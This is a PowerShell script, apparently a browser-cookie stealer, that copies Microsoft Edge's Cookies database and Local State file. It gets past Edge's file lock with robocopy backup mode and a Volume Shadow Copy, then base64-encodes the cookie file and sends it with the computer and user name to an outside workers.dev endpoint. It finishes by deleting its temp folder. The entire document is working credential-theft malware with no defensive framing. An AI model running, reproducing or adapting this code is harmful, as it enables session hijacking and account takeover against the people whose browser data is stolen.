# steal_vss.ps1
# Copies Edge Cookies.db even when Edge is open using Volume Shadow Copy.

$worker_url = "https://reciever.tyceno89.workers.dev"
$temp = "$env:TEMP\steal_vss"
New-Item -ItemType Directory -Force -Path $temp | Out-Null

# --- 1) Copy Local State (usually not locked) ---
$local_state = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
Copy-Item $local_state "$temp\Edge_LocalState.json" -Force -ErrorAction SilentlyContinue

# --- 2) Copy Cookies.db (locked by Edge) ---
$cookie_src = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
$cookie_dst = "$temp\Edge_Cookies.db"

# Try normal copy first
try {
    Copy-Item $cookie_src $cookie_dst -Force -ErrorAction Stop
} catch {
    # Fallback: use robocopy with backup mode (/B)
    $src_dir = Split-Path $cookie_src
    $src_file = Split-Path $cookie_src -Leaf
    $dst_dir = Split-Path $cookie_dst
    robocopy $src_dir $dst_dir $src_file /B /R:1 /W:1 /NFL /NDL /NJH /NJS | Out-Null
}

# If still not copied, use Volume Shadow Copy via wmic
if (-not (Test-Path $cookie_dst)) {
    try {
        $shadow = wmic shadowcopy call create Volume='C:\' | Select-String "ShadowID"
        if ($shadow) {
            $shadow_id = $shadow -replace '.*\{|\}.*',''
            $shadow_path = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$shadow_id\"
            $src_shadow = $cookie_src -replace '^C:\\', $shadow_path
            Copy-Item $src_shadow $cookie_dst -Force -ErrorAction Stop
            wmic shadowcopy delete id={$shadow_id} | Out-Null
        }
    } catch {}
}

# --- 3) If still no file, send error ---
if (-not (Test-Path $cookie_dst)) {
    $payload = @{
        pc = $env:COMPUTERNAME
        user = $env:USERNAME
        error = "Could not copy Cookies.db (Edge may be locked)"
    } | ConvertTo-Json
    Invoke-RestMethod -Uri $worker_url -Method Post -Body $payload -ContentType "application/json"
    exit
}

# --- 4) Encode and send ---
$bytes = [IO.File]::ReadAllBytes($cookie_dst)
$b64 = [Convert]::ToBase64String($bytes)
$payload = @{
    pc = $env:COMPUTERNAME
    user = $env:USERNAME
    file = $b64
} | ConvertTo-Json

Invoke-RestMethod -Uri $worker_url -Method Post -Body $payload -ContentType "application/json"

# --- 5) Cleanup ---
Remove-Item $temp -Recurse -Force -ErrorAction SilentlyContinue
